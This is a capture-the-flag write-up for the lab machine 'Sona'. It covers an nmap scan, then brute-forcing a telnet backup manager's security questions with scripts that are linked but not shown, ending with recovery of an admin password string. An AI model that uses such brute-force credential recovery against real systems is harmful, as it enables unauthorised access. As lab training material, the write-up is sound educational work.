### Sona Proving Grounds

### Difficulty = Intermediate

### IP Address = 192.168.232.159

Nmap Scan:

```
# Nmap 7.92 scan initiated Fri Feb 24 05:39:13 2023 as: nmap -sCV -A -p23,8081 -oN nmapscan -Pn 192.168.232.159
Nmap scan report for 192.168.232.159
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  telnet?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|     RESTORE Restore backup
|     Incorrect
|   NULL, tn3270: 
|     ====================
|     NEXUS BACKUP MANAGER
|     ====================
|     ANSONE Answer question one
|     ANSTWO Answer question two
|     BACKUP Perform backup
|     EXIT Exit
|     HELP Show help
|     HINT Show hints
|     RECOVER Recover admin password
|_    RESTORE Restore backup
8081/tcp open  http    Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.1-01 (OSS)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 24 05:39:45 2023 -- 1 IP address (1 host up) scanned in 31.73 seconds
```

From the scan we see that theres only 2 ports open

We have a telnet service running an a web http server

#### Enumerating Port 23

Checking it shows this

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
HINT
1.What is your zodiac sign?
2.What is your favorite color?
lol
Incorrect
Connection closed by foreign host.
```

It looks interesting and from this what we would likely want to get is the admin password

But on problem it requires password

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
RECOVER
Please Enter Password
RECOVER <password>
RECOVER lol
Incorrect
Connection closed by foreign host.
```

From the hint it seems like if we get it we will be given a password 

Searching for the meaning of zodiac and the examples leads [here](https://www.britannica.com/topic/zodiac)

There are different types of examples given so i just put it in a script to get the correct one instead of doing it manually [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/sona/zodiac_brute.py)

I got issues with receiving the correct value cause of new lines i couldn't figure it out but hey it works in debug mode 😜

Running it shows that the correct value of the zodiac sign is `leo`

```
─$ python3 zodaicbrute.py
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x6 bytes:
    b'aries\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xf6 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'tauras\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'gemini\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xf6 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x7 bytes:
    b'cancer\n'
[+] Receiving all data: Done (288B)
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x5 bytes:
    b'HINT\n'
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[-] Receiving all data: Failed
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
```

Here's the right value

```
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[-] Receiving all data: Failed
[DEBUG] Received 0xec bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'1.What is your zodiac sign?\n'
    b'2.What is your favorite color?\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
 ```
 
 Cool we can also verify it by inputting the value from the telnet session
 
 ```
 └─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
leo
Correct!
hey
Incorrect
Connection closed by foreign host.
```

Now we need the favourite colour I made another brute force script which also i had issues with lines lol

Here's the script [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/sona/color_brute.py)

Running it shows that the colour is `black`

```
└─$ python3 color.py
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x5 bytes:
    b'blue\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x7 bytes:
    b'yellow\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'green\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0xa bytes:
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x7 bytes:
    b'indigo\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'white\n'
[+] Receiving all data: Done (259B)
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xc4 bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
    b'Incorrect\n'
[*] Closed connection to 192.168.232.159 port 23
[+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'black\n'
[-] Receiving all data: Failed
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
 ```
 
 Here's it 
 
 ```
 [+] Opening connection to 192.168.232.159 on port 23: Done
[DEBUG] Sent 0x4 bytes:
    b'leo\n'
[DEBUG] Sent 0x6 bytes:
    b'black\n'
[-] Receiving all data: Failed
[DEBUG] Received 0x3f bytes:
    b'====================\n'
    b'NEXUS BACKUP MANAGER\n'
    b'====================\n'
[DEBUG] Received 0xba bytes:
    b'ANSONE \tAnswer question one\n'
    b'ANSTWO \tAnswer question two\n'
    b'BACKUP \tPerform backup\n'
    b'EXIT \tExit\n'
    b'HELP \tShow help\n'
    b'HINT \tShow hints\n'
    b'RECOVER\tRecover admin password\n'
    b'RESTORE\tRestore backup\n'
    b'Correct!\n'
[DEBUG] Received 0x9 bytes:
    b'Correct!\n'
  ```
  
  Now lets see what happens after putting the two correct values
  
  ```
  ┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/Sona]
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
leo
Correct!
black
Correct!
RECOVER leoblack
Incorrect
Connection closed by foreign host.
```

I know that the required password is correct but no i need the password to access the RECOVER function 

After trying few combinations of `leo` & `black` It lead me to the correct one which is `blackleo`

```
└─$ telnet 192.168.232.159 23
Trying 192.168.232.159...
Connected to 192.168.232.159.
Escape character is '^]'.
====================
NEXUS BACKUP MANAGER
====================
ANSONE  Answer question one
ANSTWO  Answer question two
BACKUP  Perform backup
EXIT    Exit
HELP    Show help
HINT    Show hints
RECOVER Recover admin password
RESTORE Restore backup
blackleo
3e409e89-514c-4f9f-955e-dfa5c4083518
```


 


